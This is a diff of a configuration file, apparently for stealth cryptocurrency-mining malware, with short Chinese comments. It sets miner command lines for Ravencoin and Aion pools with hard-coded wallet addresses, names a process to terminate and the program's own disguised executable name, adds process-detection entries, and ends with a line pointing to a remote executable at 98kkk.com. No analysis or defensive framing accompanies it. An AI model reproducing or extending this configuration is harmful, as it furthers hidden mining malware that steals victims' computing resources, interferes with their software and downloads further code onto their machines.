@@ -4,9 +4,10 @@ AA390K.exe3AA
 AA491K.exe4AA
 AA599K.exe5AA
 AA694K.exe6AA
-AA795K.exe7AA
+AA795K.exe7AA-----7和8写错同样功能重复设置无效
 AA897K.exe8AA
 AA996K.exe9AA
+------------------------------------------------------------------------------------------------------------------------------------
 A1A-- -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RNxtTYaFdtxHTAHXcXM99BSdJMjL7WC1Az.mr14@pplns -i 14 -p x--A1A
 A2A-- -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RNxtTYaFdtxHTAHXcXM99BSdJMjL7WC1Az.mr14@pplns -i 15 -p x--A2A
 A3A-- -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RNxtTYaFdtxHTAHXcXM99BSdJMjL7WC1Az.mr14@pplns -i 16 -p x--A3A
@@ -14,11 +15,17 @@ A4A-- -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RNxtTYaFdtxHTAHXcXM9
 A5A-- -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RNxtTYaFdtxHTAHXcXM99BSdJMjL7WC1Az.mr14@pplns -i 14 -p x--A5A
 A6A-- -o stratum+tcp://rvn-pool.beepool.org:9531 -a x16r -u RNxtTYaFdtxHTAHXcXM99BSdJMjL7WC1Az.mr14@pplns -i 15 -p x--A6A
 A9A--ON1--A9A
-A0A--\TP5Helper.exe--A0A
-A8A--TP5Helper.exe--A8A---需要终止
-B1B--sfdgefggfdgsdrgdfgcxvbdfg--B1B---取邮标题名
-B2B--sfdgefggfdgsdrgdfgcxvbdfg--B2B---取标题名
+------------------------------------------------------------------------------------------------------------------------------------
+A0A--\AASDASDAS.exe--A0A
+A8A--AASDASDAS.exe--A8A---自身
+------------------------------------------------------------------------------------------------------------------------------------
+B1B--sfdgefggfdgsdrgdfgcxvbdfg--B1B---取进程
+B2B--sfdgefggfdgsdrgdfgcxvbdfg--B2B---取进程
 B3B--取取取取取取取取取取--B3B---取邮进程
 B4B--取取取取取取取取取--B4B---取进程
+------------------------------------------------------------------------------------------------------------------------------------
 AION--  --algo aion --fee 0 --intensity 1 --pec --server cluster.aionpool.tech --port 3333 --user 0xa0e942264d06d6212d3bb1f6a67d4986867a370b47623973f22fa4fb30be905d.98KK --pass x--AION
   ONAI--ON1--ONAI
+------------------------------------------------------------------------------------------------------------------------------------
+GX--ON1--GX
+SWGX--http://98kkk.com/98kkk.exe--SWGX
